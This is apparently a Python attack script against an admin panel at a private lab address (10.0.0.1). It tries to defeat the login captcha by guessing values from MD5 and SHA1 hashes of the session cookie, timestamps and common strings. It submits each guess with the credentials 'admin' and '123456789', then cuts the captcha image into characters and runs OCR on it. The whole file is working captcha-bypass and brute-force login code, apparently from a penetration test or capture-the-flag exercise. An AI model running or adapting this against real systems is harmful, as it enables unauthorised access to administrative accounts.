import requests
import hashlib
from PIL import Image
import io

TARGET = "http://10.0.0.1"
CAPTCHA_URL = f"{TARGET}/admin/index?action=captcha.js"
LOGIN_URL = f"{TARGET}/admin/index?execute=1&exec=login"

# Get captcha, try to derive its value from session ID or other data
s = requests.Session()

# Get captcha image
resp = s.get(CAPTCHA_URL)
sid = dict(s.cookies).get("PHPSESSID", "?")

print(f"Session ID: {sid}")

# Try captcha values based on session
attempts = set()

# MD5 hash of session
md5_hash = hashlib.md5(sid.encode()).hexdigest()
for length in [4, 5, 6]:
    val = md5_hash[:length]
    attempts.add(val)
    attempts.add(val.upper())

# SHA1 hash
sha1_hash = hashlib.sha1(sid.encode()).hexdigest()
for length in [4, 5, 6]:
    val = sha1_hash[:length]
    attempts.add(val)

# Try current timestamp
import time
ts = str(int(time.time()))
attempts.add(ts[-4:])
attempts.add(ts[-5:])
attempts.add(ts[-6:])

# Common captcha patterns
for val in ["1234", "0000", "1111", "abcd", "test", "code", "admin",
            str(hash(sid) % 10000), str(abs(hash(sid)))[:4]]:
    attempts.add(val)

print(f"Testing {len(attempts)} captcha values...")

for captcha in attempts:
    r = s.post(LOGIN_URL, data={"username": "admin", "password": "123456789", "captcha": captcha})
    result = r.text.strip()
    if result != "CAPTCHA code is not the same":
        print(f"  captcha='{captcha}': {result[:60]}")
    if "success" in result.lower():
        print(f"  *** LOGIN SUCCESS with captcha '{captcha}' ***")

# Try: what if captcha is validated against the session captcha,
# but we can reuse the same session and captcha value?
# 1. Get captcha (stores value in session)
# 2. Try to read the image and decode it manually
print("\n=== Manual captcha decoding ===")
resp = s.get(CAPTCHA_URL)
img = Image.open(io.BytesIO(resp.content))
if img.mode == "P":
    img = img.convert("RGB")

w, h = img.size
# Find character positions by analyzing vertical pixel sums
col_sums = []
for x in range(w):
    black_px = sum(1 for y in range(h) if sum(img.getpixel((x, y))[:3]) < 384)
    col_sums.append(black_px)

# Find character boundaries
in_char = False
chars = []
for x in range(w):
    if col_sums[x] > 2 and not in_char:
        chars.append([x, x])
        in_char = True
    elif col_sums[x] > 2 and in_char:
        chars[-1][1] = x
    elif col_sums[x] <= 2 and in_char:
        in_char = False

print(f"Found {len(chars)} possible characters at positions: {chars}")
for i, (start, end) in enumerate(chars):
    if end - start > 1:
        char_img = img.crop((start-1, 0, end+1, h))
        char_img.save(f"char_{i}.png")
        print(f"  Char {i}: cols {start}-{end}, width={end-start}")

# Try pytesseract if available
try:
    import pytesseract
    # Check if tesseract is installed
    try:
        text = pytesseract.image_to_string(img, config="--psm 8")
        print(f"\nOCR result: '{text.strip()}'")
    except Exception as e:
        print(f"\nTesseract not available: {e}")
except ImportError:
    print("\npytesseract not installed")
